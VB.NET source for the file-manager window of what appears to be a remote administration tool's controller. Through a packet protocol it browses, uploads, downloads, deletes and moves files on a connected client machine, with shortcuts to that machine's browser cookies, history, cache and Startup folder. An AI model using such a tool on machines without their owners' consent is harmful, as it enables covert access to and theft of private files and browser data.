Imports ComponentOwl.BetterListView
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports System.Environment
Imports LuxNET.LuxNET

Public Class FileManager

    Public client As ServerClient
    Private before As String
    Public curuploaditem As Integer
    Private filename As String
    Private packer As LuxNET.Pack
    Private showthumbs As Boolean
    Private sw As Stopwatch
    Private temp As Integer
    Public Sub New()
        Me.packer = New LuxNET.Pack
        Me.curuploaditem = 0
        Me.sw = New Stopwatch
        Me.temp = 0
        Me.showthumbs = False
        Me.InitializeComponent()
    End Sub

    Private Sub lam1(ByVal a0 As Object, ByVal a1 As EventArgs)
        Me.PasteHereItem_Click()
    End Sub

    Private Sub lam2(ByVal a0 As Object, ByVal a1 As EventArgs)
        Me.MoveHereItem_Click()
    End Sub

    Private Sub lam3(ByVal a0 As Object, ByVal a1 As EventArgs)
        Me.PasteFile()
    End Sub

    Private Sub lam4(ByVal a0 As Object, ByVal a1 As EventArgs)
        Me.MoveFile()
    End Sub

    Private Sub AppDataToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AppDataToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "AppData"})
    End Sub

    Private Sub AppDataLocalToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AppDataLocalToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "AppDataLocal"})
    End Sub

    Private Sub btn_back_Click(sender As Object, e As EventArgs) Handles btn_back.Click
        Dim num As Integer = My.Forms.FormMain.CountCharacter(Me.cb_path.Text, "\"c)
        Dim str As String = Me.cb_path.Text.Replace((Me.cb_path.Text.Split(New Char() {"\"c})((num - 1)) & "\"), "")
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(7), str})
        GC.Collect()
    End Sub

    Private Sub btn_forward_Click(sender As Object, e As EventArgs) Handles btn_forward.Click
        Me.LV_Filemanager.Items.Clear()
        If (Strings.Right(Me.cb_path.Text, 1) <> "\") Then
            Dim box As ComboBox = Me.cb_path
            box.Text = (box.Text & "\")
        End If
        Me.SendPacket(New Object() {CByte(7), Me.cb_path.Text})
        GC.Collect()
    End Sub

    Private Sub btn_refresh_Click(sender As Object, e As EventArgs) Handles btn_refresh.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(7), My.Forms.FormMain.path})
        GC.Collect()
    End Sub

    Private Sub btn_showthumbnails_Click(sender As Object, e As EventArgs) Handles btn_showthumbnails.Click
        Dim size3 As Size
        If Not Me.showthumbs Then
            Me.TP_FM.Controls.Remove(My.Forms.FormMain.previewimage)
            Me.TP_FM.Controls.Remove(My.Forms.FormMain.previewtext)
            size3 = New Size(&H2BF, Me.LV_Filemanager.Size.Height)
            Me.LV_Filemanager.Size = size3
            Me.LV_Filemanager.Anchor = (AnchorStyles.Left Or (AnchorStyles.Bottom Or AnchorStyles.Top))
            size3 = New Size(&H4AB, &H1D1)
            Me.Size = size3
            Me.showthumbs = True
        Else
            My.Forms.FormMain.w = 0
            My.Forms.FormMain.h = 0
            Me.TP_FM.Controls.Remove(My.Forms.FormMain.previewimage)
            Me.TP_FM.Controls.Remove(My.Forms.FormMain.previewtext)
            size3 = New Size(&H37B, &H1D1)
            Me.Size = size3
            Me.LV_Filemanager.Anchor = (AnchorStyles.Right Or (AnchorStyles.Left Or (AnchorStyles.Bottom Or AnchorStyles.Top)))
            Me.showthumbs = False
        End If
    End Sub
    Public Shared Function ByteUnits(ByVal numberBytes As Double, ByVal digits As Integer) As String
        Dim strArray As String()
        Dim d As Double = Math.Log(numberBytes, 1024)
        If (d < 0) Then
            strArray = New String() {"B", "mB", "µB", "nB", "pB", "fB", "aB", "zB", "yB"}
        Else
            strArray = New String() {"B", "KB", "MB", "GB", "TB", "PB", "EB", "ZB", "YB"}
        End If
        Dim num2 As Integer = Math.Min(strArray.Length, CInt(Math.Round(Math.Floor(d))))
        Dim num3 As Double = (numberBytes / Math.Pow(1024, CDbl(num2)))
        Return (num3.ToString(("0." & New String("0"c, digits))) & " " & strArray(Math.Abs(num2)))
    End Function

    Private Sub cb_path_KeyDown(sender As Object, e As KeyEventArgs) Handles cb_path.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            Me.btn_forward_Click(RuntimeHelpers.GetObjectValue(sender), Nothing)
        End If
        GC.Collect()
    End Sub

    Private Sub cb_path_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cb_path.SelectedIndexChanged
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(7), Me.cb_path.Text})
        GC.Collect()
    End Sub
    Private Sub client_WriteProgressChanged(ByVal sender As ServerClient, ByVal progress As Double, ByVal bytesWritten As Integer, ByVal bytesToWrite As Integer)
        Me.LV_Transfers.Items.Item(Me.curuploaditem).SubItems.Item(1).Text = ((Conversions.ToString(CInt(Math.Round(progress))) & "%"))
        Me.LV_Transfers.Items.Item(Me.curuploaditem).SubItems.Item(3).Text = ((FileManager.ByteUnits((CDbl(bytesWritten) / (CDbl(Me.sw.ElapsedMilliseconds) / 1000)), 1) & "/s"))
        If (CInt(Math.Round(progress)) = 100) Then
            Me.sw.Stop()
            Me.LV_Transfers.Items.Item(Me.curuploaditem).SubItems.Item(4).Text = ("Uploaded")
            RemoveHandler Me.client.WriteProgressChanged, New ServerClient.WriteProgressChangedEventHandler(AddressOf Me.client_WriteProgressChanged)
            Me.curuploaditem += 1
        End If
        GC.Collect()
    End Sub

    Private Sub CookiesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CookiesToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Cookies"})
    End Sub

    Private Sub CopyFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyFileToolStripMenuItem.Click
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.before = (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text)
                Me.filename = Me.LV_Filemanager.SelectedItems.Item(0).Text
                Dim item As New ToolStripMenuItem("Paste File here")
                item.Image = My.Resources.document_import
                item.Name = "Copy1f"
                Me.CMS_Filemanager.Items.Add(item)
                AddHandler item.Click, New EventHandler(AddressOf Me.lam3)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CopyFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyFolderToolStripMenuItem.Click
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length = 0) Then
                Me.before = (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\")
                Me.filename = Me.LV_Filemanager.SelectedItems.Item(0).Text
                Dim item As New ToolStripMenuItem("Paste Folder here")
                item.Image = My.Resources.folder_import
                item.Name = "Copy1"
                Me.CMS_Filemanager.Items.Add(item)
                AddHandler item.Click, New EventHandler(AddressOf Me.lam1)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CreateNewFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateNewFileToolStripMenuItem.Click
        Try
            My.Forms.NewFile.Text = ("Create New File - " & Me.client.EndPoint.Address.ToString)
            My.Forms.NewFile.client = Me.client
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                My.Forms.NewFile.path = My.Forms.FormMain.path
            Else
                My.Forms.NewFile.path = (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\")
            End If
            My.Forms.NewFile.Show()
            GC.Collect()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            My.Forms.NewFile.Text = ("Create New File - " & Me.client.EndPoint.Address.ToString)
            My.Forms.NewFile.client = Me.client
            My.Forms.NewFile.path = My.Forms.FormMain.path
            My.Forms.NewFile.Show()
            GC.Collect()
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub CreateNewFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CreateNewFolderToolStripMenuItem.Click
        Dim str As String = Interaction.InputBox("Please enter a valid new folder name!", "New Folder", "", -1, -1)
        If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
            Try
                If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                    Me.SendPacket(New Object() {CByte(10), (My.Forms.FormMain.path & str)})
                Else
                    Me.SendPacket(New Object() {CByte(10), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\" & str)})
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.SendPacket(New Object() {CByte(10), (My.Forms.FormMain.path & str)})
                ProjectData.ClearProjectError()
            End Try
            GC.Collect()
        End If
    End Sub

    Private Sub DeleteFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFileToolStripMenuItem.Click
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.SendPacket(New Object() {CByte(15), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text)})
                GC.Collect()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub DeleteFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFolderToolStripMenuItem.Click
        Try
            Me.SendPacket(New Object() {CByte(11), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\")})
            GC.Collect()
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub DesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DesktopToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Desktop"})
    End Sub

    Private Sub DocumentsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DocumentsToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Documents"})
    End Sub

    Private Sub DownloadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadFileToolStripMenuItem.Click
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.SendPacket(New Object() {CByte(9), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text)})
                GC.Collect()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub FileManager_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.SendPacket(New Object() {CByte(6)})
        GC.Collect()
    End Sub
    Public Function FormatSize(ByVal size As Long) As Object
        Dim num As Long = size
        If ((num >= 0) AndAlso (num <= &H3FF)) Then
            Return Strings.Format((Conversions.ToString(size) & " Bytes"), "")
        End If
        If ((num >= &H400) AndAlso (num <= &HFFFFF)) Then
            Return (Strings.Format((CDbl(size) / 1024), "###0.00") & " KB")
        End If
        If ((num >= &H100000) AndAlso (num <= &H3E363C80)) Then
            Return (Strings.Format((CDbl(size) / 1048576), "###0.00") & " MB")
        End If
        If (num > &H3E363C80) Then
            Return (Strings.Format((CDbl(size) / 1073741824), "###0.00") & " GB")
        End If
        Return "N/A"
    End Function

    Private Sub HistoryToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles HistoryToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "History"})
    End Sub

    Private Sub InternetCacheToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles InternetCacheToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Cache"})
    End Sub

    Private Sub LV_Filemanager_Click(sender As Object, e As EventArgs) Handles LV_Filemanager.Click
        Try
            If ((Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) AndAlso Me.showthumbs) Then
                Me.SendPacket(New Object() {CByte(&H15), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text)})
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub LV_Filemanager_DoubleClick(sender As Object, e As EventArgs) Handles LV_Filemanager.DoubleClick
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length = 0) Then
                Dim str As String = (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\")
                Me.LV_Filemanager.Items.Clear()
                Me.SendPacket(New Object() {CByte(7), str})
                GC.Collect()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub LV_Filemanager_KeyDown(sender As Object, e As KeyEventArgs) Handles LV_Filemanager.KeyDown
        If (e.KeyCode = Keys.Enter) Then
            Me.LV_Filemanager_DoubleClick(RuntimeHelpers.GetObjectValue(sender), Nothing)
        ElseIf (e.KeyCode = Keys.Back) Then
            Me.btn_back_Click(RuntimeHelpers.GetObjectValue(sender), Nothing)
        End If
        GC.Collect()
    End Sub
    Private Sub MoveFile()
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.SendPacket(New Object() {CByte(20), Me.before, (My.Forms.FormMain.path & Me.filename)})
            Else
                Me.SendPacket(New Object() {CByte(20), Me.before, (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\" & Me.filename)})
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Me.SendPacket(New Object() {CByte(20), Me.before, (My.Forms.FormMain.path & Me.filename)})
            ProjectData.ClearProjectError()
        End Try
        Me.CMS_Filemanager.Items.RemoveByKey("Move1f")
    End Sub

    Private Sub MoveFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MoveFolderToolStripMenuItem.Click
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length = 0) Then
                Me.before = (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\")
                Me.filename = Me.LV_Filemanager.SelectedItems.Item(0).Text
                Dim item As New ToolStripMenuItem("Move Folder here")
                item.Image = My.Resources.folder_import
                item.Name = "Move1"
                Me.CMS_Filemanager.Items.Add(item)
                AddHandler item.Click, New EventHandler(AddressOf Me.lam2)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Private Sub MoveHereItem_Click()
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.SendPacket(New Object() {CByte(&H13), Me.before, (My.Forms.FormMain.path & Me.filename)})
            Else
                Me.SendPacket(New Object() {CByte(&H13), Me.before, (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\" & Me.filename)})
            End If
            Me.CMS_Filemanager.Items.RemoveByKey("Move1")
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Me.SendPacket(New Object() {CByte(&H13), Me.before, (My.Forms.FormMain.path & Me.filename)})
            Me.CMS_Filemanager.Items.RemoveByKey("Move1")
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub MoveFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MoveFileToolStripMenuItem.Click
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.before = (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text)
                Me.filename = Me.LV_Filemanager.SelectedItems.Item(0).Text
                Dim item As New ToolStripMenuItem("Move File here")
                item.Image = My.Resources.document_import
                item.Name = "Move1f"
                Me.CMS_Filemanager.Items.Add(item)
                AddHandler item.Click, New EventHandler(AddressOf Me.lam4)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub MusicToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MusicToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Music"})
    End Sub
    Private Sub PasteFile()
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.SendPacket(New Object() {CByte(&H12), Me.before, (My.Forms.FormMain.path & Me.filename)})
            Else
                Me.SendPacket(New Object() {CByte(&H12), Me.before, (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\" & Me.filename)})
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Me.SendPacket(New Object() {CByte(&H12), Me.before, (My.Forms.FormMain.path & Me.filename)})
            ProjectData.ClearProjectError()
        End Try
        Me.CMS_Filemanager.Items.RemoveByKey("Copy1f")
    End Sub
    Private Sub PasteHereItem_Click()
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Me.SendPacket(New Object() {CByte(&H11), Me.before, (My.Forms.FormMain.path & Me.filename)})
            Else
                Me.SendPacket(New Object() {CByte(&H11), Me.before, (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\" & Me.filename)})
            End If
            Me.CMS_Filemanager.Items.RemoveByKey("Copy1")
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Me.SendPacket(New Object() {CByte(&H11), Me.before, (My.Forms.FormMain.path & Me.filename)})
            Me.CMS_Filemanager.Items.RemoveByKey("Copy1")
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub PicturesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PicturesToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Pictures"})
    End Sub

    Private Sub ProgramsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ProgramsToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Programs"})
    End Sub

    Private Sub RenameFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameFileToolStripMenuItem.Click
        Try
            If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                Dim str As String = Interaction.InputBox("please enter a valid name and extension for renaming the file!", "Rename File", "", -1, -1)
                If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                    Me.SendPacket(New Object() {CByte(&H10), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text), str})
                    GC.Collect()
                End If
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub RenameFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameFolderToolStripMenuItem.Click
        Try
            Dim str As String = Interaction.InputBox("Please enter a valid name for renaming the folder!", "Rename Folder", "", -1, -1)
            If ((Not str Is Nothing) AndAlso (str.Length <> 0)) Then
                Me.SendPacket(New Object() {CByte(12), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\"), str})
                GC.Collect()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            ProjectData.ClearProjectError()
        End Try
    End Sub
    Private Sub SendPacket(ByVal ParamArray args As Object())
        Dim data As Byte() = Me.packer.Serialize(args)
        Me.client.Send(data)
        GC.Collect()
    End Sub

    Private Sub StartupToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartupToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Startup"})
    End Sub

    Private Sub TempToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TempToolStripMenuItem.Click
        Me.LV_Filemanager.Items.Clear()
        Me.SendPacket(New Object() {CByte(&H16), "Temp"})
    End Sub

    Private Sub UploadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadFileToolStripMenuItem.Click
        Dim dialog As New OpenFileDialog
        Dim dialog2 As OpenFileDialog = dialog
        dialog2.InitialDirectory = Environment.GetFolderPath(SpecialFolder.Desktop)
        dialog2.Multiselect = False
        dialog2.Title = "Select Files to upload to the Client machine..."
        If (dialog2.ShowDialog = DialogResult.OK) Then
            dialog2 = Nothing
            Dim item As BetterListViewItem = Me.LV_Transfers.Items.Add(New FileInfo(dialog.FileName).Name, 0)
            item.SubItems.Add("0%")
            item.SubItems.Add(RuntimeHelpers.GetObjectValue(Me.FormatSize(New FileInfo(dialog.FileName).Length)))
            item.SubItems.Add("")
            item.SubItems.Add("")
            item.SubItems.Add("Waiting")
            item = Nothing
            AddHandler Me.client.WriteProgressChanged, New ServerClient.WriteProgressChangedEventHandler(AddressOf Me.client_WriteProgressChanged)
            Try
                If (Me.LV_Filemanager.SelectedItems.Item(0).SubItems.Item(2).Text.Length <> 0) Then
                    Me.SendPacket(New Object() {CByte(13), My.Forms.FormMain.path, New FileInfo(dialog.FileName).Name, File.ReadAllBytes(dialog.FileName)})
                Else
                    Me.SendPacket(New Object() {CByte(13), (My.Forms.FormMain.path & Me.LV_Filemanager.SelectedItems.Item(0).Text & "\"), New FileInfo(dialog.FileName).Name, File.ReadAllBytes(dialog.FileName)})
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Me.SendPacket(New Object() {CByte(13), My.Forms.FormMain.path, New FileInfo(dialog.FileName).Name, File.ReadAllBytes(dialog.FileName)})
                ProjectData.ClearProjectError()
            End Try
            Me.sw.Start()
            GC.Collect()
        End If
    End Sub

    Public Enum PacketHeaders As Byte
        ' Fields
        CopyDir = &H11
        CopyFile = &H12
        DeleteFile = 15
        DeleteFolder = 11
        DownloadFile = 9
        Drives = 6
        ListFiles = 7
        MonitorCounts = 2
        MoveDir = &H13
        MoveFile = 20
        NewConnection = 0
        NewFile = 14
        NewFolder = 10
        PcBounds = 4
        RemoteDesktop = 1
        RenameFile = &H10
        RenameFolder = 12
        SpecialDir = &H16
        Thumbnail = &H15
        UploadFile = 13
    End Enum
End Class